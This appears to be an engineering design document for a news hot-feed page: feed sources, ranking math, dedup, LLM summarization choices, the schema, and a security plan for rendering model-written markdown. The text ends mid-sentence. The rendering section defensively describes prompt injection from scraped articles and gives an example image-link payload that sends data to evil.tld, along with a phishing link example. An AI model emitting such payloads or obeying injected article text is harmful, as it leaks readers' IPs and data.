# News: a hot-feed page for AI, Stack and GenZ

A fourth workspace page at `/news`. It collects what is hot right now from public
feeds, ranks it, groups it into three categories, and shows a markdown summary of
the main points on each item's detail page.

Every endpoint named in this document was fetched and confirmed working on
2026-08-25. Endpoints that were proposed and turned out to be dead are recorded
in [Sources that do not work](#sources-that-do-not-work) rather than deleted —
the next person to have this idea will otherwise propose them again.

Two of them passed that check and still failed in production, which is worth
saying plainly: a feed verified from a laptop is verified from a laptop. Reddit
answers 200 there and 403 from a datacenter, and the Verge URL was simply
mistyped in a way a 404 would only reveal once something fetched it on a
schedule. The collector records `last_error` per source for exactly this reason.

## The shape it borrows

This is the job market with different nouns. `jobs-sync` already fetches public
JSON and RSS server-side, normalizes each source into one shape, collapses
duplicates, classifies with versioned deterministic rules, keeps raw payloads in
`private`, audits every run per source, and is scheduled by `pg_cron` reading
Vault. All of that is the right architecture here and none of it needs to be
reinvented.

```text
news-sync (Deno)                     news-summarize (Deno)
  ├── fetch ~20 public feeds           ├── pick top unsummarized items
  ├── normalize → NewsItem             ├── fetch article, extract text
  ├── canonical URL + dedupe           ├── one LLM call → markdown
  ├── deterministic category           └── write summary_md
  ├── snapshot attention counters
  └── score hotness
        │
        ▼
public.news_items (RLS, approved users read)
private.news_item_payloads / news_article_text (service role only)
```

The two functions are deliberately separate. Collection must keep working when
the summarizer's provider is down, out of quota, or being swapped — and the
summarizer must never be the reason the feed is empty.

## Categories

Three, fixed, decided by rules rather than by a model.

| Category  | What it collects                                                                               |
| --------- | ---------------------------------------------------------------------------------------------- |
| **AI**    | Harnesses, guidelines, models, benchmarks, skills, plugins; vendor announcements; useful repos |
| **Stack** | Trending technologies, releases, projects; layoffs, hiring and big-company moves               |
| **GenZ**  | Slang in circulation; what Gen Z are doing, globally and in Vietnam                            |

`AI` and `Stack` are well served by machine-readable sources. `GenZ` is not, and
pretending otherwise would produce a page that is quietly wrong. See
[The GenZ problem](#the-genz-problem).

## Sources

`weight` is the multiplier applied to a source's blended score, so a low-signal
firehose cannot outrank a curated feed on volume alone.

### AI

| Source                 | Endpoint                                                                               | Hotness field            | Weight |
| ---------------------- | -------------------------------------------------------------------------------------- | ------------------------ | ------ |
| HN front page          | `https://hn.algolia.com/api/v1/search?tags=front_page`                                 | `points`, `num_comments` | 1.0    |
| HN vendor watch        | `https://hn.algolia.com/api/v1/search_by_date?query=…&tags=story`                      | `points`                 | 0.8    |
| Lobsters AI            | `https://lobste.rs/t/ai.json`                                                          | `score`                  | 0.9    |
| HF trending models     | `https://huggingface.co/api/models?sort=trendingScore&direction=-1&limit=50&full=true` | `trendingScore`          | 1.0    |
| HF daily papers        | `https://huggingface.co/api/daily_papers?limit=50`                                     | `paper.upvotes`          | 1.0    |
| OpenAI news            | `https://openai.com/news/rss.xml`                                                      | none — announcement      | 1.0    |
| Google DeepMind        | `https://deepmind.google/blog/rss.xml`                                                 | none                     | 0.9    |
| Mistral news           | `https://mistral.ai/news/rss`                                                          | none                     | 0.8    |
| OpenAI status          | `https://status.openai.com/api/v2/incidents.json`                                      | none — incident          | 1.0    |
| Claude status          | `https://status.claude.com/api/v2/summary.json`                                        | none — incident          | 1.0    |
| Mistral status         | `https://status.mistral.ai/feed.rss`                                                   | none                     | 0.6    |
| arXiv cs.AI / cs.CL    | `https://export.arxiv.org/api/query?search_query=cat:cs.AI&sortBy=submittedDate&…`     | none — join to HF        | 0.5    |
| GitHub releases        | `https://github.com/{owner}/{repo}/releases.atom`                                      | none — release event     | 0.9    |
| GitHub trending mirror | `https://githubtrending.lessx.xyz/trending?since=weekly`                               | `increased` (star delta) | 0.8    |
| OSS Insight            | `https://api.ossinsight.io/v1/trends/repos/?period=past_week`                          | `stars`                  | 0.7    |

Three things worth knowing before writing the connectors:

**Algolia's `numericFilters` needs URL-encoded comparators.** An unencoded `>`
returns garbage. Use `%3E` / `%3C`.

**`status.openai.com/api/v2/summary.json` has no `incidents` key** — it carries
only `page`, `status`, `components`. Use `/api/v2/incidents.json` for OpenAI.
`status.claude.com`'s `summary.json` does carry incidents.

**HF trending is dominated by quantization mirrors.** `unsloth/*-GGUF`,
`mradermacher/*` and friends will show the same base model five times. Dedupe on
the `base_model:` tag.

Anthropic publishes no official news feed. The community mirror
(`raw.githubusercontent.com/taobojlen/anthropic-rss-feed/main/anthropic_news_rss.xml`)
works but was 11 days stale when checked — treat it as best-effort, and rely on
the HN vendor-watch query as the real signal for Anthropic announcements.

### Stack

| Source             | Endpoint                                                               | Hotness field              | Weight |
| ------------------ | ---------------------------------------------------------------------- | -------------------------- | ------ |
| HN via hnrss       | `https://hnrss.org/frontpage?points=100`                               | pre-filtered               | 1.0    |
| Lobsters hottest   | `https://lobste.rs/hottest.json`                                       | `score`                    | 0.9    |
| dev.to top         | `https://dev.to/api/articles?tag={tag}&top=7`                          | `public_reactions_count`   | 0.6    |
| GitHub releases    | `https://github.com/{owner}/{repo}/releases.atom`                      | none — release event       | 1.0    |
| npm downloads      | `https://api.npmjs.org/downloads/point/last-week/{pkg,pkg,pkg}`        | week-over-week delta       | 0.7    |
| Supabase blog      | `https://supabase.com/rss.xml`                                         | none                       | 0.8    |
| Vercel changelog   | `https://vercel.com/atom`                                              | none                       | 0.7    |
| TechCrunch layoffs | `https://techcrunch.com/tag/layoffs/feed/`                             | none                       | 1.0    |
| TechCrunch hiring  | `https://techcrunch.com/tag/hiring/feed/`                              | none                       | 0.9    |
| The Verge tech     | `https://www.theverge.com/rss/tech/index.xml`                          | none                       | 0.8    |
| Google News query  | `https://news.google.com/rss/search?q=layoffs+when:7d&hl=en-US&…`      | none                       | 0.6    |
| SEC EDGAR 8-K 2.05 | `https://efts.sec.gov/LATEST/search-index?q=%22Item+2.05%22&forms=8-K` | none — filing is the event | 1.0    |
| Company newsrooms  | Apple, Microsoft, Meta, Google, Amazon, Nvidia press RSS               | none                       | 0.7    |

`releases.atom` is the single highest-value Stack source and costs nothing —
pick fifteen repos you actually care about (`react`, `vite`, `bun`, `deno`,
`next.js`, `typescript`, `postgres`, `tailwindcss`, `supabase`, `vercel/ai`,
`langchain`, …) and each becomes a row in `news_sources`. All ten sampled
returned valid Atom with ten entries.

SEC EDGAR full-text search is the layoff source nobody uses: an 8-K carrying
Item 2.05 _is_ a company announcing a restructuring, with a legal obligation to
be accurate, days before the press covers it. It requires a descriptive
`User-Agent` header. layoffs.fyi has no usable API — its Airtable backend answers
401 to anything that is not a real browser.

### GenZ

| Source                 | Endpoint                                                | Gives                  | Weight |
| ---------------------- | ------------------------------------------------------- | ---------------------- | ------ |
| Google Trends VN       | `https://trends.google.com/trending/rss?geo=VN`         | 10 rising searches     | 1.0    |
| Google Trends US       | `https://trends.google.com/trending/rss?geo=US`         | 20 rising searches     | 0.8    |
| Kênh14 học đường       | `https://kenh14.vn/hoc-duong.rss`                       | 50 items, VN youth     | 1.0    |
| Kênh14 đời sống        | `https://kenh14.vn/doi-song.rss`                        | 50 items               | 0.9    |
| Tuổi Trẻ nhịp sống trẻ | `https://tuoitre.vn/rss/nhip-song-tre.rss`              | 50 items               | 1.0    |
| Thanh Niên giới trẻ    | `https://thanhnien.vn/rss/gioi-tre.rss`                 | 50 items               | 0.9    |
| VnExpress đời sống     | `https://vnexpress.net/rss/doi-song.rss`                | 60 items               | 0.8    |
| Urban Dictionary       | `https://api.urbandictionary.com/v0/define?term={term}` | definitions for a term | —      |
| Wikimedia pageviews    | `https://wikimedia.org/api/rest_v1/metrics/pageviews/…` | daily views for a term | —      |
| Merriam-Webster WOTD   | `https://www.merriam-webster.com/wotd/feed/rss2`        | one word/day           | 0.5    |
| Reddit r/GenZ (Atom)   | `https://www.reddit.com/r/GenZ/.rss`                    | 25 entries             | 0.7    |

Reddit's `.rss` works; Reddit's `.json` does not — `www.reddit.com/r/x/hot.json`
returns a 403 HTML block page. The Atom feeds also rate-limit hard: nine
back-to-back fetches produced one 200 and eight 429s. Fetch **one Reddit feed
per run**, rotating, with a real `User-Agent`.

## The GenZ problem

Half of what is wanted here has no free programmatic source, and the plan should
say so rather than quietly under-deliver.

- **TikTok is closed.** The Creative Center trend endpoint answers
  `{"code":40101,"msg":"no permission"}`. The Research API requires an academic
  affiliation. There is no free way in.
- **Know Your Meme is behind Cloudflare.** Every RSS path returns 403.
- **Google Trends RSS gives ten rising searches, not slang.** It surfaces what
  is being searched, which is adjacent to but not the same as what is being
  said.

What remains supports a different, honest design: **GenZ is a watchlist, not a
firehose.**

An admin adds a term (`six seven`, `rizz`, `cà phê hẹn hò`) to a
`news_watch_terms` table. Each sync then, for every active term:

1. calls Urban Dictionary for definitions and their vote counts,
2. pulls Wikimedia pageviews for the matching article over the last 30 days,
3. runs a Google News RSS query scoped to the term,
4. records the daily numbers as a time series.

The page then shows the term with a sparkline of whether it is rising or dying,
plus the Vietnamese lifestyle feed as the ambient "what are they doing" stream.
That is a real product, it is fully automatable, and it does not claim to have
read TikTok.

The alternative — an admin pasting in slang they heard — is also fine, and the
watchlist table supports it either way.

## Ranking

Two rules carry most of the value, and both are counterintuitive enough to be
worth stating before any code:

**Never rank on a lifetime counter.** GitHub stars and HF downloads accumulate
forever, so absolute values rank a 2019 repo above everything that happened this
week. Only the 24-hour delta is a hotness signal.

**Never copy Reddit's `hot` formula.** `sign·log10(|s|) + seconds/45000` rises by
+1 every 12.5 hours regardless of votes — it is a within-feed sort key, not a
score. Subtract the `now` term to get the relative form, or old items float to
the top forever.

### v1: enough to ship

One attention scalar per item per snapshot, log-compressed, normalized against
that source's own median, decayed:

```ts
const attention = {
  hn: p.points + 0.5 * p.comments,
  reddit: p.ups + 0.4 * p.comments,
  github: p.starsDelta24h, // delta, never total
  hf: 8 * p.likesDelta24h + Math.log1p(p.downloadsDelta24h),
  rss: null, // no counter — see below
}[family];

const x = Math.log1p(attention);
const rel = x / Math.max(sourceMedianX, 0.5); // per-source, 14-day median
const vel = prev ? Math.log((now + k) / (prev + k)) / dtHours : null;

const halfLife =
  { hn: 5, reddit: 4, github: 24, hf: 36, rss: 8 }[family] *
  { ai: 1.3, stack: 1.5, genz: 0.7 }[category];

hotness =
  (vel === null ? rel : 0.6 * rel + 0.4 * velZ) *
  sourceWeight *
  Math.exp((-Math.LN2 * ageHours) / halfLife);
```

Sources with no counter at all — every RSS feed, every status page, every
release Atom — get a flat editorial score from `weight`, decayed. An OpenAI model
announcement does not need upvotes to be the most important thing on the page.

Store the time-independent part as a column and apply decay at query time. A
materialized view containing `now()` is stale the moment it is refreshed.

### v2: when v1 is not discriminating well

Replace the median normalization with a robust z-score against a
`(source, metric, age_bucket)` rolling baseline:
`σ̂ = MAD / 0.6745`, `z = clamp((x − median) / max(σ̂, 0.22), −3, 6)`. The `σ̂`
floor is mandatory — on a low-volume feed where half the items have one upvote,
MAD collapses to zero and `z` goes to infinity. Blend absolute z, velocity z, a
Wilson lower bound as a quality gate, and a corroboration term for stories
appearing on several sources at once, re-normalizing the weights over whichever
components are actually present. A brand-new item has no velocity; scoring that
as `0` rather than `null` means new items can never enter the feed.

The full derivation, the verified HN and Reddit constants, and the ten failure
modes are in [Ranking reference](#ranking-reference).

### Dedup

Union-find over key families, merging when two items share any key within 72
hours.

**Canonical URL** does the heavy lifting: force `https`, drop the hash and port,
strip `www.`/`m.`/`amp.`, remove ~40 tracking parameters, sort the rest, collapse
`/index.html` and trailing slashes. Then entity overrides that collapse whole
families to one key — `arxiv:2608.20169` (strip the version, `v1` and `v3` are
the same paper), `github:owner/repo`, `hf:org/model`, `yt:{id}`, `doi:{id}`,
`x:{tweetId}`.

For HN and Reddit the key comes from the item's **external** URL, not the
permalink — otherwise the same article submitted to both never merges. Self-posts
have no external URL and fall through to title matching.

**Title shingling** catches the rest: normalize case and punctuation, take
3-word shingles, simhash to 64 bits, and match on Hamming distance ≤ 3 within the
same day.

### Category routing

A four-stage cascade, first confident match wins, no model involved.

1. **Host allowlist** — `huggingface.co`, `openai.com`, `anthropic.com` → AI;
   `stackoverflow.com`, `postgresql.org`, `rust-lang.org` → Stack;
   `tiktok.com`, `knowyourmeme.com` → GenZ.
2. **Conditional hosts** — `arxiv.org` routes on its primary category
   (`cs.AI|cs.LG|cs.CL|cs.CV|stat.ML` → AI, else Stack); `github.com` routes on
   repo topics and language.
3. **Source prior** — `r/LocalLLaMA` and the HF endpoints are exclusive and
   short-circuit; `r/programming` and HN only contribute a weighted nudge,
   because both carry all three categories.
4. **Lexicon** — versioned keyword tables scored against title and excerpt, ties
   broken in the fixed order AI → Stack → GenZ → other.

Version the lexicon the way `JOB_PARSER_VERSION` is versioned, and re-run
classification when it changes.

## Summarization

The question was: can this be done without AI, and if not, is it better to paste
into a free chat by hand or put an API key on the server?

### What algorithms can and cannot do

**Article extraction is solved — use it, no model required.** Pulling clean body
text out of a news page benchmarks at F1 0.94. This stage should be algorithmic
regardless of what summarizes it.

**Extractive summarization is worse than doing nothing clever.** On CNN/DailyMail
the LEAD-3 baseline — take the first three sentences — scores ROUGE-1 40.2.
TextRank scores 33.2. The graph algorithm loses to `split('.')[:3]` by seven
points, and not because it is untuned: news is written inverted-pyramid, so the
important sentences are already first and there is nothing for centrality to
discover.

More to the point, extractive methods emit **whole original sentences**. They
cannot merge two facts into one bullet, cannot shorten, cannot reorder by
importance, cannot write markdown, and cannot tell that the real news is in
paragraph nine. On tech articles they reliably surface the CEO's quote about
synergy and miss the deprecation notice.

So: extraction algorithmic, summarization by model. If a placeholder is wanted
so the page is never empty on day one, use LEAD-3 — one line, and it benchmarks
better than the thing that takes a weekend.

### The cost premise is wrong by an order of magnitude

Sixty articles a day at ~2,000 input and ~400 output tokens:

| Model            | Per month | Batch API (50% off) |
| ---------------- | --------- | ------------------- |
| Claude Haiku 4.5 | **$7.20** | **$3.60**           |
| Claude Sonnet 5  | $21.60    | $10.80              |
| Claude Opus 5    | $36.00    | $18.00              |

Haiku is $0.004 per article. The manual copy-paste loop is being weighed against
a cost that is roughly one coffee per month — and it is a chore that has to be
performed every single day forever, on a hobby project, which is exactly the kind
of obligation that kills hobby projects.

Skip prompt caching. A summarization system prompt is 150–400 tokens, far under
Haiku 4.5's 4,096-token cacheable minimum, so it silently will not cache. Take
the flat 50% from the Batch API instead.

### What shipped instead: the provider is a secret

The table above priced one vendor, and the premise underneath it — that a model
good enough for this costs money — turned out to be wrong too. Reciting five
facts from a page already in the context window is the easiest thing an LLM
does, and several providers give it away.

So `news-summarize` speaks the OpenAI chat-completions shape rather than any
vendor's own, and reads `SUMMARY_API_BASE`, `SUMMARY_MODEL` and
`SUMMARY_API_KEY` from the environment. Groq, OpenRouter, DeepSeek and Together
all implement it; so does Claude, through OpenRouter. Changing provider is a
secret edit, not a deployment.

Free tiers verified 2026-08-27, against the live APIs rather than the blog
roundups — which were wrong about both, listing Llama models Groq no longer
serves and a request cap 14x the real one:

| Provider           | Free allowance                     | Binding limit        |
| ------------------ | ---------------------------------- | -------------------- |
| Groq               | 1,000 req/day, 8,000 tokens/minute | tokens per minute    |
| OpenRouter, $0     | 50 req/day, 20 req/minute          | requests per day     |
| OpenRouter, $10 in | 1,000 req/day, 20 req/minute       | credits never expire |

The scheduled batch is twelve articles four times a day — 48 requests. That sits
inside Groq's daily cap with room for the button, and _exactly_ at OpenRouter's
free 50, which is why Groq is the default.

Groq's per-minute token budget is the real constraint, and it is what
`SUMMARY_REASONING` exists for. Reasoning models bill private thinking to the
completion budget: the same article, summarized with the same facts, spent 172
output tokens at `low` and 647 at `medium`. The default is `low`; a 429 is
retried once, honouring `retry-after`.

No frontier model is free anywhere, and none is needed here. Of OpenRouter's 17
`:free` models, `z-ai/glm-5.2` and `minimax/minimax-m3` are the strongest
open-weight options if Groq's per-minute budget ever becomes the thing that
hurts.

### Do not proxy the ChatGPT subscription

`codex-gateway` already forwards to the connected ChatGPT accounts and would make
this free. It should not be used for this.

OpenAI's Terms of Use prohibit using "any automated or programmatic method to
extract data or output from the Services" except as permitted through the API. A
consumer subscription is not the API, the Codex entitlement is scoped to Codex,
and an unattended nightly cron summarizing news articles is precisely the
prohibited pattern. Enforcement across the industry tightened through 2026, and
the penalty is account suspension rather than a rate-limit error — which would
take the Agents page's whole reason for existing with it.

The upside is $7.20 a month. It is not close.

### If free is still wanted

Google Gemini's free tier is the best of them — Gemini 3 Flash at roughly 10 RPM
and 1,500 RPD, which is 25× the headroom this needs. Two caveats: Google's terms
say unpaid-quota content is used to improve their products, and free-tier
availability is restricted in the EEA, UK and Switzerland. Cloudflare Workers AI
is the runner-up and is correctly sized (this workload consumes about half the
10,000 free daily neurons).

Three commonly-recommended options are dead or misreported and should not be
built on: **GitHub Models was fully retired on 2026-07-30**; **Cerebras is now a
30-day $5 trial**, not a permanent free tier; and **Groq's chat models are
1,000 requests/day**, not the 14,400 every listicle repeats — that number belongs
to their safety-classifier models.

### The recommendation

Ship in this order, because the third step answers a question nobody has asked
yet.

1. **Extraction + storage.** `linkedom` → `@mozilla/readability` → store
   `article.textContent` in `private.news_article_text`. Every later option needs
   this. An hour of work.
2. **LEAD-3 placeholder** so the detail page is never blank.
3. **The admin paste form**, and one week of doing it by hand at ~10 items/day.
   This is the cheap experiment that establishes whether anyone actually reads
   the summaries. Do not automate before knowing.
4. **Nightly Batch API job on Haiku 4.5**, once step 3 says it is worth it. Key
   the summary on a content hash so a bug can never re-summarize the archive, and
   store the model id and prompt version next to each summary so a prompt change
   can be re-run deliberately.

Keep the admin form permanently — as the fallback when the provider is down, and
as the place to fix a bad summary. It just must never be the pipeline.

Two guards regardless of which summarizer wins: validate the extracted text
length before spending a call (paywalls and JS-rendered pages yield empty text,
and summarizing a cookie banner costs the same as summarizing an article), and
always render the source link beside the summary — the cheapest hallucination
mitigation there is.

## Rendering markdown

There is no markdown dependency today, and the content is written by a model that
just read an untrusted web page. That makes this a security decision before it is
a formatting one: **assume every byte of `summary_md` was authored by whoever
controls the source article.**

### The library

`react-markdown` + `remark-gfm` + `rehype-sanitize`, ~51 kB gzipped, lazy-loaded
behind `React.lazy` in a single shared `src/components/markdown-view.tsx` so the
detail page and the editor share one chunk.

It renders to React elements, so there is no `dangerouslySetInnerHTML` anywhere.
That is the whole argument. `marked` + DOMPurify is half the size, but it
produces an HTML string — verified to pass `<script>` and `javascript:` hrefs
through untouched — so safety becomes "if we remember to sanitize" rather than a
property of the render path. Saving 27 kB is not worth that trade.

Add `@tailwindcss/typography` (+2.4 kB of CSS) and use `prose prose-invert
prose-sm max-w-none`; otherwise a dozen elements need hand-written overrides.

### Three layers

**Defaults.** `react-markdown` escapes raw HTML to text and neutralizes non-http
protocols on `href` and `src`. Three rules keep that true, and are worth an
oxlint `no-restricted-imports` rule so they survive the next refactor: never add
`rehype-raw`, never override `urlTransform`, never pass a `components` override
that calls `dangerouslySetInnerHTML`.

**A tightened sanitize schema.** Do not pass `defaultSchema` — it is
GitHub-shaped and allows `img[src]` from any origin, `div`, `section` and a long
wildcard attribute list. Allow only the tags a summary needs, drop the `*`
attribute list entirely, and restrict `href` protocols to `http`/`https`/
`mailto`.

**No images at all.** This is the vector that gets missed: with zero JavaScript,
an injected `![](https://evil.tld/px.png?q=…)` fires an outbound request the
moment anyone opens the post, leaking their IP and whatever the injection
persuaded the model to encode in the path. Links cannot be dropped — they are the
point — so render the hostname inline next to each one, which is a real
anti-phishing control against `[Supabase docs](https://evil.tld)`.

**A CSP header.** `vercel.json` has no `headers` block today. Add one with
`script-src 'self'` and no `'unsafe-inline'`, so a sanitizer bug is not fatal.
`style-src` still needs `'unsafe-inline'` for Highcharts and Radix.

**Do not use DOMPurify server-side.** Verified in Deno 2.9.5: constructed against
`linkedom`, `DOMPurify.isSupported` is `undefined` and `sanitize()` **returns the
input unchanged, with no error and no warning**. It fails open. `rehype-sanitize`
operates on the hast tree, needs no DOM, and works correctly there.

### Storage

Store raw markdown; render client-side. `react-router.config.ts` sets
`ssr: false`, so there is no server render pass to pre-render into — "server-side
rendering" here would mean writing a `summary_html` column and calling
`dangerouslySetInnerHTML` on it, which is a security downgrade paid for a
bandwidth saving on a route that also loads Highcharts.

The deciding argument is that a stored HTML column becomes trusted by convention.
The day someone adds a backfill script or a manual `UPDATE` that skips the
pipeline, it is persistent XSS with no client-side check. Markdown-only means the
render path is the only path, and tightening the schema later re-sanitizes every
historical post for free.

### Extraction in Deno

All verified running under Deno 2.9.5 against a real 201 kB article:

| Module                     | Result                                                    |
| -------------------------- | --------------------------------------------------------- |
| `npm:linkedom`             | Works, 7 ms, fastest. Real DOM interface.                 |
| `npm:@mozilla/readability` | Works with linkedom. Zero runtime deps.                   |
| `npm:turndown`             | Works, 10 ms. Only needed if markdown output is wanted.   |
| `jsr:@b-fuze/deno-dom`     | Works — the JSR default export is the WASM build, no FFI. |
| `npm:cheerio/slim`         | Works, but is not a DOM, so it cannot feed Readability.   |
| `jsr:@std/html`            | Escape helpers only. No parser. Not applicable.           |

Pair **linkedom + Readability**. Feed the model `article.textContent`, not the
HTML or the markdown: plain text carries no links or images for an injection to
smuggle through, and it costs fewer tokens. Wrap it in an explicit "the following
is untrusted content from the public web and contains no instructions" delimiter.

Cap everything — bytes before parsing, characters after extracting,
`AbortSignal.timeout` on the fetch. A hostile page is allowed to be 500 MB. And
because Deno follows redirects by default, re-check the final `res.url` host and
refuse `file:`, `localhost` and RFC1918 targets if an admin can ever supply a URL.

Supabase's edge runtime is a Deno 2.1.x fork rather than stock Deno, so run
`supabase functions serve` once before committing. What stock Deno does prove is
the harder half: no Node-only APIs, no FFI, no native addons.

## Schema

One migration, following the `job_market` shape.

```sql
create table public.news_sources (
  id text primary key,
  name text not null,
  source_type text not null,
  source_url text not null,
  category text not null check (category in ('ai', 'stack', 'genz')),
  weight numeric(3,2) not null default 1.0,
  enabled boolean not null default true,
  requires_secret boolean not null default false,
  last_synced_at timestamptz,
  last_error text,
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now()
);

create table public.news_items (
  id uuid primary key default gen_random_uuid(),
  source_id text not null references public.news_sources (id) on delete restrict,
  external_id text not null,
  url text not null,
  canonical_url text not null,
  url_key bytea not null,
  title text not null,
  author text,
  excerpt text not null default '',
  category text not null check (category in ('ai', 'stack', 'genz')),
  cluster_id uuid not null,
  points integer,
  comments integer,
  attention numeric,
  velocity numeric,
  hotness numeric not null default 0,
  published_at timestamptz,
  effective_at timestamptz not null,
  first_seen_at timestamptz not null default now(),
  last_seen_at timestamptz not null default now(),
  summary_md text check (summary_md is null or length(summary_md) <= 20000),
  summary_model text,
  summary_prompt_version text,
  summary_status text not null default 'pending'
    check (summary_status in ('pending', 'extracted', 'summarized', 'failed', 'skipped')),
  content_hash text not null,
  parser_version text not null,
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now(),
  unique (source_id, external_id)
);

create index news_items_feed_idx
on public.news_items (category, hotness desc, effective_at desc);

create index news_items_url_key_idx on public.news_items (url_key);
create index news_items_cluster_idx on public.news_items (cluster_id);

create table public.news_item_metrics (
  id bigint generated by default as identity primary key,
  item_id uuid not null references public.news_items (id) on delete cascade,
  captured_at timestamptz not null default now(),
  attention numeric not null,
  unique (item_id, captured_at)
);

create table public.news_watch_terms (
  id uuid primary key default gen_random_uuid(),
  term text not null unique,
  locale text not null default 'vi',
  added_by uuid not null references public.profiles (id) on delete restrict,
  active boolean not null default true,
  created_at timestamptz not null default now()
);

create table public.news_watch_metrics (
  id bigint generated by default as identity primary key,
  term_id uuid not null references public.news_watch_terms (id) on delete cascade,
  captured_on date not null,
  wiki_views integer,
  ud_definitions integer,
  ud_thumbs_up integer,
  unique (term_id, captured_on)
);

create table private.news_item_payloads (
  item_id uuid primary key references public.news_items (id) on delete cascade,
  raw_payload jsonb not null,
  updated_at timestamptz not null default now(),
  check (jsonb_typeof(raw_payload) = 'object')
);

create table private.news_article_text (
  item_id uuid primary key references public.news_items (id) on delete cascade,
  extracted_text text not null,
  extracted_at timestamptz not null default now()
);
```

Plus `news_sync_runs` and `news_sync_source_runs` copied field-for-field from the
job-market equivalents, including the `one_running_unique` partial index and the
per-source coverage audit.

RLS mirrors the job market exactly: `revoke all from anon, authenticated`,
`grant select to authenticated`, one `using ((select public.is_approved_user()))`
policy per public table, `grant all to service_role`, and no browser grant on
`private` at all. Writes to `private` go through a `store_news_payloads(jsonb)`
security-definer function that asserts `auth.role() = 'service_role'`, the same
bridge `store_job_payloads` uses.

Publishing gate: a summary that has not been reviewed should not be assumed
correct. `summary_status` starts at `pending`, and the detail page shows the
extracted excerpt until a summary exists.

## Files

| File                                           | Change                                                                      |
| ---------------------------------------------- | --------------------------------------------------------------------------- |
| `supabase/migrations/…_create_news.sql`        | Everything above                                                            |
| `supabase/migrations/…_schedule_news_sync.sql` | `pg_cron` entry reading `news_sync_url` from Vault                          |
| `supabase/functions/_shared/news-sources.ts`   | Source registry, connectors, `NEWS_PARSER_VERSION`                          |
| `supabase/functions/_shared/news-rank.ts`      | Canonical URL, dedupe keys, category cascade, hotness                       |
| `supabase/functions/_shared/article.ts`        | linkedom + Readability extraction with the caps                             |
| `supabase/functions/news-sync/index.ts`        | Run orchestration + per-source audit, mirroring `jobs-sync`                 |
| `supabase/functions/news-summarize/index.ts`   | Extract → summarize → write, admin or scheduled                             |
| `supabase/config.toml`                         | `[functions.news-sync]` / `[functions.news-summarize]` `verify_jwt = false` |
| `src/services/news/index.ts` + `queries.ts`    | Transport and normalization, `newsQueryKeys`                                |
| `src/services/auth/access.ts`                  | `canSynchronizeNews`, `canEditNewsSummary`                                  |
| `src/routes/_app.news/route.tsx`               | `/news` — category tabs, hot list, sync button                              |
| `src/routes/_app.news.$id/route.tsx`           | `/news/:id` — summary, source link, admin editor                            |
| `src/components/markdown-view.tsx`             | Lazy renderer + the shared sanitize schema                                  |
| `src/routes/_app/workspace-shell.tsx`          | Nav item and `pageTitleByPath` entry                                        |
| `src/styles/root/root-index.css`               | `@plugin "@tailwindcss/typography";`                                        |
| `vercel.json`                                  | `headers` block with the CSP                                                |
| `docs/architecture.md`, `README.md`            | Document the new pipeline and its sources                                   |

New dependencies: `react-markdown`, `remark-gfm`, `rehype-sanitize`, and
`@tailwindcss/typography` as a dev dependency. Two shadcn primitives are missing
and need generating: `textarea` and `tabs`.

## Order of work

1. Migration, RLS, and the source registry seeded with five sources — HN front
   page, HF trending, OpenAI news, TechCrunch layoffs, Google Trends VN. One per
   connector shape, so every code path is exercised.
2. `news-sync` with those five, plus the run/source audit tables. Verify with a
   manual invoke before scheduling anything.
3. `/news` page reading real rows. Hotness v1. No summaries yet — the excerpt is
   enough to prove the feed is worth having.
4. Remaining sources, added a few at a time. Each one is a row plus a connector
   branch.
5. Article extraction into `private.news_article_text`, and the detail page with
   the markdown renderer and the CSP.
6. The admin paste form. Run it by hand for a week.
7. `news-summarize` on Haiku 4.5 via the Batch API, if step 6 says it earns it.
8. The GenZ watchlist — terms table, the three per-term lookups, sparkline.

Steps 1–3 are the whole feature in the sense that matters. Everything after is
worth doing only if step 3 turns out to be something you actually open.

## Sources that do not work

Recorded so they are not proposed again. All checked 2026-08-25.

| Source                          | Result                                                                                                                                                                                 |
| ------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Papers with Code API            | Dead — 301s to `huggingface.co/papers/trending`                                                                                                                                        |
| Reuters RSS                     | All paths 401                                                                                                                                                                          |
| Reddit `.json` endpoints        | 403 HTML block page                                                                                                                                                                    |
| Reddit `.rss` **from a server** | 200 from a laptop, 403 from Supabase's edge. The block is on the datacenter range, not the client, so no User-Agent gets past it — and a laptop is the one place this cannot be caught |
| Know Your Meme RSS              | 403 Cloudflare interstitial on every path                                                                                                                                              |
| TikTok Creative Center          | `{"code":40101,"msg":"no permission"}`                                                                                                                                                 |
| layoffs.fyi Airtable            | Embed HTML loads; the data call behind it 401s without a real browser                                                                                                                  |
| Dictionary.com word-of-the-day  | No feed exists — the URL returns an HTML page                                                                                                                                          |
| VnExpress `tin-noi-bat.rss`     | Returns 200 and valid RSS, but 59 of 60 items are from 2021                                                                                                                            |
| GitHub Stargazers timestamps    | 401 unauthenticated, with and without the star `Accept` header                                                                                                                         |
| GitHub GraphQL                  | Closed to unauthenticated callers entirely                                                                                                                                             |
| GitHub Trending                 | No official API. HTML only, or the third-party JSON mirror                                                                                                                             |
| layoffdata.com API              | Real endpoints, all paywalled                                                                                                                                                          |
| GitHub Models                   | Fully retired 2026-07-30                                                                                                                                                               |
| The Verge `/tech/rss/index.xml` | 404. The working path has the segments the other way round: `/rss/tech/index.xml`                                                                                                      |

## Ranking reference

Verified upstream constants, for when v1 needs replacing.

**Hacker News** (`news.arc`): `gravity 1.8`, `timebase 120 min`, score exponent
`0.8`, penalties — no-URL `0.4`, lightweight `0.17`, gag `0.1`, buried `0.001`.
Effective rank `((points−1)^0.8) / (ageHours + 2)^1.8 × Π penalties`. Controversy:
if `comments > points and comments ≥ 40`, multiply by `(points/comments)^3`.
Points include the submitter's own vote, hence `points − 1`.

**Reddit hot** (`_sorts.pyx`): `sign·log10(max(|s|,1)) + seconds/45000`, epoch
`1134028003`. Relative form: `log10(max(|s|,1)) − ageSeconds/45000`, an
exponential decay with a 3.76-hour half-life. HN's power law has a fat tail;
Reddit's has a cliff — strip both native decays and apply one common decay rather
than averaging the two scores.

**Reddit confidence**: Wilson lower bound at `z = 1.281551565545` (80%).
`(p + z²/2n − z·√((p(1−p) + z²/4n)/n)) / (1 + z²/n)`.

Reddit's API no longer returns `downs`. Reconstruct from `upvote_ratio`:
`total = score / (2r − 1)` for `r > 0.5`, guarding the singularity at `r ≈ 0.5`.

**The one that is not about ranking at all:** PostgREST caps every response at
`max_rows` — 1000 here and 1000 on hosted Supabase — silently, with a 200 and a
short array. A `.limit(5_000)` therefore does not mean what it reads as, and
